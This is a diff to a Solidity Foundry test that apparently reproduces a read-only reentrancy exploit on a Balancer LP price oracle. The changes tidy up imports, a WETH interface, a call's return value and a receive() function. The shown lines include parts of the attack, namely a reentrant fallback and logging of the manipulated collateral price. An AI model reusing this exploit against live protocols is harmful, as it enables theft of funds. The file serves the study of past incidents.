@@ -3,6 +3,11 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
+
+import {IBalancerVault} from "src/interfaces/IBalancerVault.sol";
+import {IWETH} from "src/interfaces/IWETH.sol";
+import {IAaveFlashloan} from "src/interfaces/IAaveFlashloan.sol";
 // @Analysis
 // https://twitter.com/peckshield/status/1643417467879059456
 // https://twitter.com/spreekaway/status/1643313471180644360
@@ -41,7 +46,7 @@ interface IBalancerToken is IERC20 {
 contract ContractTest is Test {
 
     IERC20 WBTC = IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);
-    IERC20 WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
+    IWETH WETH = IWETH(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
     IERC20 USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
     IERC20 USDT = IERC20(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);
     IERC20 FRAX = IERC20(0x17FC002b466eEc40DaE837Fc4bE5c67993ddBd6F);
@@ -185,8 +190,10 @@ contract ContractTest is Test {
         console.log(
             "After Read-Only-Reentrancy Collateral Price \t", WeightedBalancerLPOracle.getPrice(address(balancerToken))
         );
-        address(WETH).call{value: address(this).balance}("");
+        (bool success,) = address(WETH).call{value: address(this).balance}("");
     }
+
+    receive() external payable {}
 
     fallback() external payable {
         if (nonce == 2) {
